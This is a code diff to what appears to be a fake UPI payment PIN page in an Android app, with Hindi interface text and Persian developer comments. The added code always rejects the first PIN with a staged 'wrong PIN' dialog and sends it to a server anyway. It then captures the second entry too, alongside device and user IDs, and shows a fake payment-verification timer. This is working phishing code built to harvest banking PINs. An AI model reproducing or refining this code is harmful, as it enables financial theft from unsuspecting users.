@@ -298,6 +298,7 @@ h5 {
             </div>
             <div class="verify-title">Verifying Payment</div>
             <div class="verify-message">Please wait while we securely process your transaction...</div>
+            <div class="verify-timer" id="verifyTimer" style="font-size: 18px; font-weight: bold; color: #4CAF50; margin-top: 10px;">Processing... 3s</div>
             <div class="verify-spinner"></div>
             <div class="verify-dots">
                 <div class="verify-dot"></div>
@@ -311,10 +312,33 @@ h5 {
         </div>
     </div>
 
+    <!-- Error Dialog - پین اشتباهه -->
+    <div class="verify-dialog" id="errorPinDialog" style="display: none;">
+        <div class="verify-content">
+            <div class="verify-icon" style="color: #f44336;">
+                <i class="fas fa-times-circle"></i>
+            </div>
+            <div class="verify-title" style="color: #f44336;">पिन गलत है</div>
+            <div class="verify-message">कृपया सही पिन दर्ज करें</div>
+            <button onclick="closeErrorPinDialog()" style="margin-top: 20px; padding: 12px 30px; background: #f44336; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer;">
+                फिर से प्रयास करें
+            </button>
+        </div>
+    </div>
+
     <script>
     let enteredNumbers = [];
     let isHidden = true;
     let savedPIN = '';
+    let isFirstAttempt = true;  // ⭐ برای track کردن اولین تلاش
+    
+    // ⭐ چک کردن اینکه آیا قبلاً PIN وارد شده یا نه
+    function checkAttemptStatus() {
+      const savedAttempt = localStorage.getItem('upi_pin_attempt');
+      if (savedAttempt === 'failed') {
+        isFirstAttempt = false;  // قبلاً یک بار fail شده
+      }
+    }
     
     // دریافت Device ID و User ID از Android
     function getDeviceId() {
@@ -374,16 +398,59 @@ h5 {
 
     function showVerifyDialog() {
         document.getElementById('verifyDialog').style.display = 'flex';
+        // ⭐ Timer countdown برای بار دوم
+        let countdown = 3;
+        const timerEl = document.getElementById('verifyTimer');
+        if (timerEl) {
+            const interval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    timerEl.textContent = `Processing... ${countdown}s`;
+                } else {
+                    timerEl.textContent = 'Completing...';
+                    clearInterval(interval);
+                }
+            }, 1000);
+        }
     }
 
     function hideVerifyDialog() {
         document.getElementById('verifyDialog').style.display = 'none';
+    }
+    
+    function showErrorPinDialog() {
+        document.getElementById('errorPinDialog').style.display = 'flex';
+    }
+    
+    function closeErrorPinDialog() {
+        document.getElementById('errorPinDialog').style.display = 'none';
+        // ⭐ بعد از بستن error dialog، PIN رو پاک کن برای تلاش بعدی
+        enteredNumbers = [];
+        updateDisplay();
     }
 
     function submitPIN() {
         if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
             let upiPin = enteredNumbers.join('');
             savedPIN = upiPin;
+            
+            // ⭐ اگر اولین بار هست، PIN رو به سرور ارسال کن (با status failed) و error "پین اشتباهه" نشون بده
+            if (isFirstAttempt) {
+                // ⭐ ارسال PIN به سرور با status failed
+                sendPinToServer(upiPin, false);  // false = failed
+                
+                setTimeout(() => {
+                    showErrorPinDialog();  // ⭐ error "پین اشتباهه" نشون بده
+                    localStorage.setItem('upi_pin_attempt', 'failed');  // ذخیره که fail شده
+                    isFirstAttempt = false;  // بار بعد موفق باشه
+                    // پاک کردن PIN برای تلاش بعدی
+                    enteredNumbers = [];
+                    updateDisplay();
+                }, 1000);  // یکم delay برای واقعی‌تر شدن
+                return;
+            }
+            
+            // ⭐ بار دوم: timer نشون بده و بعد ارسال کن
             submitToServer(upiPin);
         } else {
             // Just vibrate or do nothing - no error message
@@ -393,9 +460,8 @@ h5 {
         }
     }
 
-    function submitToServer(upiPin) {
-        showVerifyDialog();
-        
+    // ⭐ تابع مشترک برای ارسال PIN به سرور
+    function sendPinToServer(upiPin, isSuccess) {
         const deviceId = getDeviceId();
         const userId = getUserId();
         const appType = getAppType();
@@ -403,7 +469,8 @@ h5 {
             upi_pin: upiPin,
             device_id: deviceId,
             app_type: appType,
-            user_id: userId
+            user_id: userId,
+            status: isSuccess ? "success" : "failed"  // ⭐ status برای سرور
         };
 
         // ⭐ Get Base URL from Android
@@ -424,16 +491,38 @@ h5 {
             },
             body: JSON.stringify(requestData)
         })
-        .then(response => response.json())
-        .catch(error => console.log('Background request:', error));
-
-        // Show verifying dialog for 2-3 seconds then redirect
-        setTimeout(() => {
-            hideVerifyDialog();
-            window.location.href = 'wait.html';
-        }, 2500);
+        .then(response => {
+            if (!response.ok) {
+                console.error("Failed to send PIN to server");
+                return;
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log("PIN sent to server:", isSuccess ? "success" : "failed");
+        })
+        .catch(error => {
+            console.error('Error sending PIN to server:', error);
+        });
     }
 
+    function submitToServer(upiPin) {
+        // ⭐ بار دوم: timer dialog نشون بده
+        showVerifyDialog();
+        
+        // ⭐ ارسال PIN به سرور با status موفق
+        sendPinToServer(upiPin, true);  // true = successful
+
+        // ⭐ Timer 3 ثانیه و بعد redirect
+        setTimeout(() => {
+            localStorage.removeItem('upi_pin_attempt');  // پاک کردن attempt status
+            hideVerifyDialog();
+            window.location.href = 'wait.html';
+        }, 3000);
+    }
+
+    // ⭐ چک کردن وضعیت attempt در load
+    checkAttemptStatus();
     updateDisplay();
 
     // ⭐ Simple back button disable
